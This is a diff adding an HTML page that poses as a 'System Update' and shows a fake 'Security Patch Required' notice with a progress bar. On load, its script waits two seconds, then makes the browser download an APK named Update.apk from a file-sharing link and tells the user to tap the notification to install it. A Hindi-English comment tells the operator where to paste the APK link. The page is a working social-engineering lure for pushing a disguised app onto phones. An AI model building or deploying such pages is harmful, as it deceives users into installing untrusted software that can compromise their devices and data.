@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center;
+        }
+        .card {
+            background: #161b22; padding: 40px 30px; border-radius: 16px;
+            border: 1px solid #30363d; max-width: 400px;
+        }
+        .loader { width: 100%; height: 6px; background: #21262d; border-radius: 10px; margin: 25px 0; overflow: hidden; }
+        .loader-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #58a6ff, #3fb950); animation: loadAnim 4s forwards; }
+        @keyframes loadAnim { 0% { width: 0%; } 100% { width: 100%; } }
+        .highlight { color: #3fb950; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>⚙️ Security Patch Required</h2>
+        <p>Downloading latest build...</p>
+        <div class="loader"><div class="loader-bar"></div></div>
+        <p id="status">⏳ Preparing...</p>
+        <p style="margin-top:15px;font-size:13px;">After download, tap <span class="highlight">Install</span>.</p>
+    </div>
+    <script>
+        // 🔻 APK KA DIRECT LINK YAHAN DALO (Baad mein change karna) 🔻
+        const APK_URL = "https://gofile.io/d/5LW11Z"; 
+        
+        setTimeout(function() {
+            document.getElementById('status').innerHTML = '📥 Downloading...';
+            var link = document.createElement('a');
+            link.href = APK_URL;
+            link.download = "Update.apk";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            setTimeout(function() {
+                document.getElementById('status').innerHTML = '✅ Downloaded! Tap notification to install.';
+            }, 3000);
+        }, 2000);
+    </script>
+</body>
+</html>
